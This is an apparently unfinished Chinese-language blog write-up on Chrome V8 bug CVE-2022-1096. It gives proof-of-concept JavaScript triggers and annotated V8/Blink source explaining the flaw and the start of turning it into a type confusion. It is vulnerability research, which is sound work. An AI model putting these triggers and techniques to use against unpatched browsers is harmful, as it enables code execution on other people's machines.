<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>CVE-2022-1096 (WIP) | PwnTips</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="CVE-2022-1096 (WIP)" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="CVE-2022-1096 是 CVE-2021-30551 的变种。" />
<meta property="og:description" content="CVE-2022-1096 是 CVE-2021-30551 的变种。" />
<link rel="canonical" href="https://pwntips.github.io/2022/11/26/CVE-2022-1096.html" />
<meta property="og:url" content="https://pwntips.github.io/2022/11/26/CVE-2022-1096.html" />
<meta property="og:site_name" content="PwnTips" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-11-26T00:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2022-1096 (WIP)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-11-26T00:00:00+08:00","datePublished":"2022-11-26T00:00:00+08:00","description":"CVE-2022-1096 是 CVE-2021-30551 的变种。","headline":"CVE-2022-1096 (WIP)","mainEntityOfPage":{"@type":"WebPage","@id":"https://pwntips.github.io/2022/11/26/CVE-2022-1096.html"},"url":"https://pwntips.github.io/2022/11/26/CVE-2022-1096.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://pwntips.github.io/feed.xml" title="PwnTips" /><script async src="https://www.googletagmanager.com/gtag/js?id=G-LDS6Z1TT65"></script>
<script>
  window['ga-disable-G-LDS6Z1TT65'] = window.doNotTrack === "1" || navigator.doNotTrack === "1" || navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1";
  window.dataLayer = window.dataLayer || [];
  function gtag(){window.dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-LDS6Z1TT65');
</script>

</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">PwnTips</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">CVE-2022-1096 (WIP)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2022-11-26T00:00:00+08:00" itemprop="datePublished">
        Nov 26, 2022
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>CVE-2022-1096 是 CVE-2021-30551 的变种。</p>

<h2 id="准备环境">准备环境</h2>

<p>阅读 <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-1096.html">Google P0 的分析报告</a> 得知修复的版本是 99.0.4844.84，搜到对应的<a href="https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_25.html">发布记录</a>，依照时间找到上一个版本是 <a href="https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_20.html">99.0.4844.82</a>，使用 <a href="/2022/05/31/get-old-version-chrome-binary.html">获取旧版本的 Chrome</a> 中的方法构建出对应的二进制文件。</p>

<h2 id="分析成因">分析成因</h2>

<p>将 POC 代码稍加修改，方便调试：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">style</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">;</span>
<span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="nx">style</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="p">{</span> <span class="na">toString</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">style</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}};</span>
<span class="nx">alert</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div></div>

<p>根据之前调试 CVE-2021-30551 积累的经验，漏洞是在 v8/src/objects/objects.cc：<code class="language-plaintext highlighter-rouge">Object::SetProperty</code> 函数执行过程中触发的，在 alert(1) 弹出后，在 Object::SetProperty 函数开头下断点，然后点掉弹窗，让程序断下后开始调试。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Maybe</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span> <span class="n">Object</span><span class="o">::</span><span class="n">SetProperty</span><span class="p">(</span><span class="n">LookupIterator</span><span class="o">*</span> <span class="n">it</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">,</span>
                                <span class="n">StoreOrigin</span> <span class="n">store_origin</span><span class="p">,</span>
                                <span class="n">Maybe</span><span class="o">&lt;</span><span class="n">ShouldThrow</span><span class="o">&gt;</span> <span class="n">should_throw</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">IsFound</span><span class="p">())</span> <span class="p">{</span>
    <span class="kt">bool</span> <span class="n">found</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
    <span class="n">Maybe</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span> <span class="n">result</span> <span class="o">=</span>
        <span class="n">SetPropertyInternal</span><span class="p">(</span><span class="n">it</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">should_throw</span><span class="p">,</span> <span class="n">store_origin</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">found</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CheckContextualStoreToJSGlobalObject</span><span class="p">(</span><span class="n">it</span><span class="p">,</span> <span class="n">should_throw</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">Nothing</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">AddDataProperty</span><span class="p">(</span><span class="n">it</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">NONE</span><span class="p">,</span> <span class="n">should_throw</span><span class="p">,</span> <span class="n">store_origin</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>大体和 CVE-2021-30551 的流程一致，虽然 style 对象还没有名为 prop 的属性，但是由于 style 是设置了 INTERCEPTOR 的 DOM 对象， 属性的查找结果是找到了 INTERCEPTOR，it-&gt;IsFound() 条件满足，程序走到 SetPropertyInternal 中，经过多层调用，最终到达 V8CSSStyleDeclaration::NamedPropertySetterCallback 函调函数。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">V8CSSStyleDeclaration</span><span class="o">::</span><span class="n">NamedPropertySetterCallback</span><span class="p">(</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Name</span><span class="o">&gt;</span> <span class="n">v8_property_name</span><span class="p">,</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">v8_property_value</span><span class="p">,</span>
    <span class="k">const</span> <span class="n">v8</span><span class="o">::</span><span class="n">PropertyCallbackInfo</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;&amp;</span> <span class="n">info</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">RUNTIME_CALL_TIMER_SCOPE_DISABLED_BY_DEFAULT</span><span class="p">(</span>
      <span class="n">info</span><span class="p">.</span><span class="n">GetIsolate</span><span class="p">(),</span> <span class="s">"Blink_CSSStyleDeclaration_NamedPropertySetter"</span><span class="p">);</span>

  <span class="c1">// 3.9.2. [[Set]]</span>
  <span class="c1">// https://webidl.spec.whatwg.org/#legacy-platform-object-set</span>
  <span class="c1">// step 1. If O and Receiver are the same object, then:</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="n">Holder</span><span class="p">()</span> <span class="o">==</span> <span class="n">info</span><span class="p">.</span><span class="n">This</span><span class="p">())</span> <span class="p">{</span>
    <span class="c1">// step 1.2.1. Invoke the named property setter with P and V.</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span> <span class="o">=</span> <span class="n">info</span><span class="p">.</span><span class="n">GetIsolate</span><span class="p">();</span>
    <span class="k">const</span> <span class="n">ExceptionState</span><span class="o">::</span><span class="n">ContextType</span> <span class="n">exception_state_context_type</span> <span class="o">=</span>
        <span class="n">ExceptionContext</span><span class="o">::</span><span class="n">Context</span><span class="o">::</span><span class="n">kNamedPropertySet</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="k">const</span> <span class="n">class_like_name</span> <span class="o">=</span> <span class="s">"CSSStyleDeclaration"</span><span class="p">;</span>
    <span class="n">ExceptionState</span> <span class="n">exception_state</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">exception_state_context_type</span><span class="p">,</span>
                                   <span class="n">class_like_name</span><span class="p">);</span>

    <span class="c1">// [CEReactions]</span>
    <span class="n">CEReactionsScope</span> <span class="n">ce_reactions_scope</span><span class="p">;</span>

    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">v8_receiver</span> <span class="o">=</span> <span class="n">info</span><span class="p">.</span><span class="n">Holder</span><span class="p">();</span>
    <span class="n">CSSStyleDeclaration</span><span class="o">*</span> <span class="n">blink_receiver</span> <span class="o">=</span>
        <span class="n">V8CSSStyleDeclaration</span><span class="o">::</span><span class="n">ToWrappableUnsafe</span><span class="p">(</span><span class="n">v8_receiver</span><span class="p">);</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Context</span><span class="o">&gt;</span> <span class="n">receiver_context</span> <span class="o">=</span>
        <span class="n">v8_receiver</span><span class="o">-&gt;</span><span class="n">GetCreationContextChecked</span><span class="p">();</span>
    <span class="n">ScriptState</span><span class="o">*</span> <span class="n">receiver_script_state</span> <span class="o">=</span> <span class="n">ScriptState</span><span class="o">::</span><span class="n">From</span><span class="p">(</span><span class="n">receiver_context</span><span class="p">);</span>
    <span class="n">ScriptState</span><span class="o">*</span> <span class="n">script_state</span> <span class="o">=</span> <span class="n">receiver_script_state</span><span class="p">;</span>
    <span class="k">const</span> <span class="n">AtomicString</span><span class="o">&amp;</span> <span class="n">blink_property_name</span> <span class="o">=</span>
        <span class="n">ToCoreAtomicString</span><span class="p">(</span><span class="n">v8_property_name</span><span class="p">.</span><span class="n">As</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span><span class="p">());</span>
    <span class="c1">// 这里会把值转换成字符串，触发其 toString 方法的回调</span>
    <span class="k">auto</span><span class="o">&amp;&amp;</span> <span class="n">blink_property_value</span> <span class="o">=</span>
        <span class="n">NativeValueTraits</span><span class="o">&lt;</span><span class="n">IDLStringTreatNullAsEmptyString</span><span class="o">&gt;::</span><span class="n">ArgumentValue</span><span class="p">(</span>
            <span class="n">isolate</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">v8_property_value</span><span class="p">,</span> <span class="n">exception_state</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">UNLIKELY</span><span class="p">(</span><span class="n">exception_state</span><span class="p">.</span><span class="n">HadException</span><span class="p">()))</span> <span class="p">{</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">auto</span><span class="o">&amp;&amp;</span> <span class="n">return_value</span> <span class="o">=</span> <span class="n">blink_receiver</span><span class="o">-&gt;</span><span class="n">AnonymousNamedSetter</span><span class="p">(</span>
        <span class="n">script_state</span><span class="p">,</span> <span class="n">blink_property_name</span><span class="p">,</span> <span class="n">blink_property_value</span><span class="p">);</span>
    <span class="n">bindings</span><span class="o">::</span><span class="n">V8SetReturnValue</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">return_value</span><span class="p">);</span>
    <span class="c1">// CSSStyleDeclaration is abusing named properties.</span>
    <span class="c1">// Do not intercept if the property is not found.</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// Do not intercept.  Fallback to OrdinarySetWithOwnDescriptor.</span>
<span class="p">}</span>
</code></pre></div></div>

<p>在 Interceptor 回调中有一个把属性值转换成字符串的操作，如果值是一个 object 的话，这里会调用它的 toString 方法，而 toString 方法里会再次设置 prop 属性，这次设置的值为 1，设置完成后控制流最终返回到外层的值设置中，乍看和 CVE-2021-30551 好像没什么区别，为什么 CVE-2021-30551 的补丁没有解决这个问题呢？ 仔细查看修补的地方发现，由于 CVE-2021-30551 漏洞触发需要将 DOM 对象 HTMLEmbed 作为普通对象的原型，所以其补丁代码放到了针对原型的属性设置代码路径上，并不能覆盖直接给 DOM 对象设置属性的情况。</p>

<hr />
<p>⚠️ 提示：由于 prop 属性并不是这个 Interceptor 期望处理的属性，AnonymousNamedSetter 的返回值为  <code class="language-plaintext highlighter-rouge">NamedPropertySetterResult::kDidNotIntercept</code> ，代表Interceptor 不处理此属性设置操作。 结果就是 Interceptor 在这个流程里实际只起了调用 toString 回调函数的作用，不影响实际赋值给 prop 属性的值。</p>

<hr />

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Maybe</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span> <span class="n">Object</span><span class="o">::</span><span class="n">SetPropertyInternal</span><span class="p">(</span><span class="n">LookupIterator</span><span class="o">*</span> <span class="n">it</span><span class="p">,</span>
                                        <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">,</span>
                                        <span class="n">Maybe</span><span class="o">&lt;</span><span class="n">ShouldThrow</span><span class="o">&gt;</span> <span class="n">should_throw</span><span class="p">,</span>
                                        <span class="n">StoreOrigin</span> <span class="n">store_origin</span><span class="p">,</span> <span class="kt">bool</span><span class="o">*</span> <span class="n">found</span><span class="p">)</span> <span class="p">{</span>
 <span class="p">...</span>

  <span class="k">do</span> <span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">())</span> <span class="p">{</span>
      <span class="p">...</span>

      <span class="k">case</span> <span class="n">LookupIterator</span><span class="o">::</span><span class="n">INTERCEPTOR</span><span class="p">:</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">HolderIsReceiverOrHiddenPrototype</span><span class="p">())</span> <span class="p">{</span>
		    <span class="c1">/// CVE-2022-1096 的控制流会走这里</span>
          <span class="n">Maybe</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span> <span class="n">result</span> <span class="o">=</span>
              <span class="n">JSObject</span><span class="o">::</span><span class="n">SetPropertyWithInterceptor</span><span class="p">(</span><span class="n">it</span><span class="p">,</span> <span class="n">should_throw</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">IsNothing</span><span class="p">()</span> <span class="o">||</span> <span class="n">result</span><span class="p">.</span><span class="n">FromJust</span><span class="p">())</span> <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
          <span class="n">Maybe</span><span class="o">&lt;</span><span class="n">PropertyAttributes</span><span class="o">&gt;</span> <span class="n">maybe_attributes</span> <span class="o">=</span>
              <span class="n">JSObject</span><span class="o">::</span><span class="n">GetPropertyAttributesWithInterceptor</span><span class="p">(</span><span class="n">it</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">maybe_attributes</span><span class="p">.</span><span class="n">IsNothing</span><span class="p">())</span> <span class="k">return</span> <span class="n">Nothing</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span><span class="p">();</span>
          <span class="k">if</span> <span class="p">((</span><span class="n">maybe_attributes</span><span class="p">.</span><span class="n">FromJust</span><span class="p">()</span> <span class="o">&amp;</span> <span class="n">READ_ONLY</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="n">WriteToReadOnlyProperty</span><span class="p">(</span><span class="n">it</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">should_throw</span><span class="p">);</span>
          <span class="p">}</span>
          <span class="c1">// &gt;&gt; CVE-2021-30551 的修补位置</span>
          <span class="c1">// At this point we might have called interceptor's query or getter</span>
          <span class="c1">// callback. Assuming that the callbacks have side effects, we use</span>
          <span class="c1">// Object::SetSuperProperty() which works properly regardless on</span>
          <span class="c1">// whether the property was present on the receiver or not when</span>
          <span class="c1">// storing to the receiver.</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">maybe_attributes</span><span class="p">.</span><span class="n">FromJust</span><span class="p">()</span> <span class="o">==</span> <span class="n">ABSENT</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Proceed lookup from the next state.</span>
            <span class="n">it</span><span class="o">-&gt;</span><span class="n">Next</span><span class="p">();</span>
          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="c1">// Finish lookup in order to make Object::SetSuperProperty() store</span>
            <span class="c1">// property to the receiver.</span>
            <span class="n">it</span><span class="o">-&gt;</span><span class="n">NotFound</span><span class="p">();</span>
          <span class="p">}</span>
          <span class="k">return</span> <span class="n">Object</span><span class="o">::</span><span class="n">SetSuperProperty</span><span class="p">(</span><span class="n">it</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">store_origin</span><span class="p">,</span>
                                          <span class="n">should_throw</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
	  <span class="p">...</span>
    <span class="p">}</span>
    <span class="n">it</span><span class="o">-&gt;</span><span class="n">Next</span><span class="p">();</span>
  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">IsFound</span><span class="p">());</span>

  <span class="o">*</span><span class="n">found</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">Nothing</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="实现利用">实现利用</h2>

<p>距离我实现 CVE-2021-30551 的利用已经过去一段时间了，一些很重要的细节我都已经忘记了，这次就重新实现下漏洞的利用过程，加深印象。</p>

<h3 id="类型混淆">类型混淆</h3>

<p>利用这个漏洞要先将漏洞转换成类型混淆，按照 CVE-2021-30551 的利用思路，通过触发两次漏洞，创建出两个有微妙区别的对象，然后再配合上 JIT 编译生成的代码，就可以把这个漏洞转换成类型混淆。</p>

<p>先触发一次漏洞得到一个具有两个 prop 属性的对象 s1，代码如下：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">s1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">p</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">;</span>
<span class="nx">v1</span> <span class="o">=</span> <span class="p">{</span> <span class="na">toString</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="nx">s1</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="mi">1</span><span class="p">}</span> <span class="p">};</span>
<span class="nx">s1</span><span class="p">.</span><span class="nx">prop</span> <span class="o">=</span> <span class="nx">v1</span><span class="p">;</span>
</code></pre></div></div>

<p>之后再一次触发漏洞, 创建一个新对象 s2，不过这次漏洞触发的时候，我们希望能在设置第二个 prop 属性时，在控制流走到 LookupIterator::ApplyTransitionToDataProperty 函数时 <code class="language-plaintext highlighter-rouge">simple_transition</code> 条件为 <code class="language-plaintext highlighter-rouge">false</code>，这样控制流会走到 <code class="language-plaintext highlighter-rouge">ReloadPropertyInformation</code> 函数中，重新在 从对象中搜索 prop 属性的位置存储到 state_ 中，搜索算法是从属性描述符的数组的开头线性搜索，这样搜到的结果就是第一个 prop 属性的描述符，而不是刚刚添加的第二个 prop。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">/// 添加属性的关键函数</span>
<span class="n">Maybe</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span> <span class="n">Object</span><span class="o">::</span><span class="n">AddDataProperty</span><span class="p">(</span><span class="n">LookupIterator</span><span class="o">*</span> <span class="n">it</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">,</span>
                                    <span class="n">PropertyAttributes</span> <span class="n">attributes</span><span class="p">,</span>
                                    <span class="n">Maybe</span><span class="o">&lt;</span><span class="n">ShouldThrow</span><span class="o">&gt;</span> <span class="n">should_throw</span><span class="p">,</span>
                                    <span class="n">StoreOrigin</span> <span class="n">store_origin</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">...</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">IsElement</span><span class="p">(</span><span class="o">*</span><span class="n">receiver</span><span class="p">))</span> <span class="p">{</span>
    <span class="p">...</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="c1">/// &lt;&lt;&lt; 这里开始是添加属性的关键点</span>
    <span class="n">it</span><span class="o">-&gt;</span><span class="n">UpdateProtector</span><span class="p">();</span>
    <span class="c1">// Migrate to the most up-to-date map that will be able to store |value|</span>
    <span class="c1">// under it-&gt;name() with |attributes|.</span>
    <span class="c1">/// &lt;&lt;&lt; 这里先准备一个存储了新属性描述符的新 map</span>
    <span class="n">it</span><span class="o">-&gt;</span><span class="n">PrepareTransitionToDataProperty</span><span class="p">(</span><span class="n">receiver</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">attributes</span><span class="p">,</span>
                                        <span class="n">store_origin</span><span class="p">);</span>
    <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">LookupIterator</span><span class="o">::</span><span class="n">TRANSITION</span><span class="p">,</span> <span class="n">it</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">());</span>
    <span class="c1">/// &lt;&lt;&lt; 将新的 map 应用到 receiver 对象</span>
    <span class="n">it</span><span class="o">-&gt;</span><span class="n">ApplyTransitionToDataProperty</span><span class="p">(</span><span class="n">receiver</span><span class="p">);</span>

    <span class="c1">// Write the property value.</span>
    <span class="c1">/// &lt;&lt;&lt; 将属性值写入 receiver 对象</span>
    <span class="n">it</span><span class="o">-&gt;</span><span class="n">WriteDataValue</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
	<span class="p">...</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="n">Just</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">LookupIterator</span><span class="o">::</span><span class="n">ApplyTransitionToDataProperty</span><span class="p">(</span>
    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSReceiver</span><span class="o">&gt;</span> <span class="n">receiver</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">...</span>
  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">transition</span> <span class="o">=</span> <span class="n">transition_map</span><span class="p">();</span>
  <span class="kt">bool</span> <span class="n">simple_transition</span> <span class="o">=</span> <span class="c1">// &lt;&lt;&lt;&lt;&lt; 关键点1</span>
      <span class="n">transition</span><span class="o">-&gt;</span><span class="n">GetBackPointer</span><span class="p">(</span><span class="n">isolate_</span><span class="p">)</span> <span class="o">==</span> <span class="n">receiver</span><span class="o">-&gt;</span><span class="n">map</span><span class="p">(</span><span class="n">isolate_</span><span class="p">);</span>

  <span class="p">...</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">simple_transition</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">number_</span> <span class="o">=</span> <span class="n">transition</span><span class="o">-&gt;</span><span class="n">LastAdded</span><span class="p">();</span>
    <span class="n">property_details_</span> <span class="o">=</span> <span class="n">transition</span><span class="o">-&gt;</span><span class="n">GetLastDescriptorDetails</span><span class="p">(</span><span class="n">isolate_</span><span class="p">);</span>
    <span class="n">state_</span> <span class="o">=</span> <span class="n">DATA</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">receiver</span><span class="o">-&gt;</span><span class="n">map</span><span class="p">(</span><span class="n">isolate_</span><span class="p">).</span><span class="n">is_dictionary_map</span><span class="p">())</span> <span class="p">{</span>
	<span class="p">...</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">ReloadPropertyInformation</span><span class="o">&lt;</span><span class="nb">false</span><span class="o">&gt;</span><span class="p">();</span> <span class="c1">// &lt;&lt;&lt;&lt;&lt; 关键点2</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="k">template</span> <span class="o">&lt;</span><span class="kt">bool</span> <span class="n">is_element</span><span class="p">&gt;</span>
<span class="kt">void</span> <span class="n">LookupIterator</span><span class="o">::</span><span class="n">ReloadPropertyInformation</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">state_</span> <span class="o">=</span> <span class="n">BEFORE_PROPERTY</span><span class="p">;</span>
  <span class="n">interceptor_state_</span> <span class="o">=</span> <span class="n">InterceptorState</span><span class="o">::</span><span class="n">kUninitialized</span><span class="p">;</span>
  <span class="n">state_</span> <span class="o">=</span> <span class="n">LookupInHolder</span><span class="o">&lt;</span><span class="n">is_element</span><span class="o">&gt;</span><span class="p">(</span><span class="n">holder_</span><span class="o">-&gt;</span><span class="n">map</span><span class="p">(</span><span class="n">isolate_</span><span class="p">),</span> <span class="o">*</span><span class="n">holder_</span><span class="p">);</span> <span class="c1">// &lt;&lt;&lt; 关键点3</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">IsFound</span><span class="p">()</span> <span class="o">||</span> <span class="o">!</span><span class="n">holder_</span><span class="o">-&gt;</span><span class="n">HasFastProperties</span><span class="p">(</span><span class="n">isolate_</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>这样一来程序运行 WriteDataValue 函数时，就会到的用第一个属性的描述符和第二个属性的值作为参数调用 WriteToField 函数。由于正常情况下，这里描述符存和值的类型时匹配的，在 WriteToField 函数中不会严格的校验 value 是否和描述符指定的类型匹配，有几处强制类型转换操作，我们利用这点来实现漏洞的利用。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">LookupIterator</span><span class="o">::</span><span class="n">WriteDataValue</span><span class="p">(</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">value</span><span class="p">,</span>
                                    <span class="kt">bool</span> <span class="n">initializing_store</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="n">DATA</span><span class="p">,</span> <span class="n">state_</span><span class="p">);</span>
<span class="cp">#if V8_ENABLE_WEBASSEMBLY
</span>  <span class="c1">// WriteDataValueToWasmObject() must be used instead for writing to</span>
  <span class="c1">// WasmObjects.</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">holder_</span><span class="o">-&gt;</span><span class="n">IsWasmObject</span><span class="p">(</span><span class="n">isolate_</span><span class="p">));</span>
<span class="cp">#endif  // V8_ENABLE_WEBASSEMBLY
</span>
